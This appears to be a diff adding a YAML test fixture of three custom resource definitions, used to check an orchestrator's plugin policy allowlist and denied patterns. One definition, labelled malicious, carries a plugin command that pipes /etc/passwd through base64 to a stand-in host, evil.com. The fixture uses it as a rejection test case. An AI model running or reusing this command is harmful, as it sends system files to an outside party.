@@ -1,0 +1,86 @@
+# CRD with plugins — used for plugin policy QA testing.
+# This manifest should be REJECTED by the default plugin policy (Allowlist with empty allowlist).
+# To allow it, create a plugin-policy.yaml with:
+#   mode: allowlist
+#   allowed_command_prefixes: ["scripts/"]
+---
+apiVersion: orchestrator.dev/v2
+kind: CustomResourceDefinition
+metadata:
+  name: webhookreceivers.integrations.orchestrator.dev
+spec:
+  kind: WebhookReceiver
+  plural: webhookreceivers
+  short_names: [whr]
+  group: integrations.orchestrator.dev
+  versions:
+    - name: v1
+      served: true
+      schema:
+        type: object
+        properties:
+          endpoint:
+            type: string
+          secret_ref:
+            type: string
+  plugins:
+    - name: verify-hmac
+      type: interceptor
+      phase: webhook.authenticate
+      command: "scripts/verify-hmac.sh"
+      timeout: 5
+    - name: normalize-payload
+      type: transformer
+      phase: webhook.transform
+      command: "scripts/normalize.sh"
+      timeout: 10
+    - name: rotate-secrets
+      type: cron
+      schedule: "0 0 0 * * *"
+      command: "scripts/rotate-secrets.sh"
+      timezone: "UTC"
+  hooks:
+    on_create: "scripts/on-create-hook.sh"
+---
+# CRD with malicious plugin — should always be rejected by denied patterns.
+apiVersion: orchestrator.dev/v2
+kind: CustomResourceDefinition
+metadata:
+  name: exfilreceivers.evil.dev
+spec:
+  kind: ExfilReceiver
+  plural: exfilreceivers
+  group: evil.dev
+  versions:
+    - name: v1
+      served: true
+      schema:
+        type: object
+  plugins:
+    - name: exfiltrate
+      type: interceptor
+      phase: webhook.authenticate
+      command: "curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)"
+      timeout: 5
+---
+# CRD without plugins — should always be accepted regardless of policy.
+apiVersion: orchestrator.dev/v2
+kind: CustomResourceDefinition
+metadata:
+  name: featureflags.config.orchestrator.dev
+spec:
+  kind: FeatureFlag
+  plural: featureflags
+  short_names: [ff]
+  group: config.orchestrator.dev
+  versions:
+    - name: v1
+      served: true
+      schema:
+        type: object
+        required: [enabled]
+        properties:
+          enabled:
+            type: boolean
+          description:
+            type: string
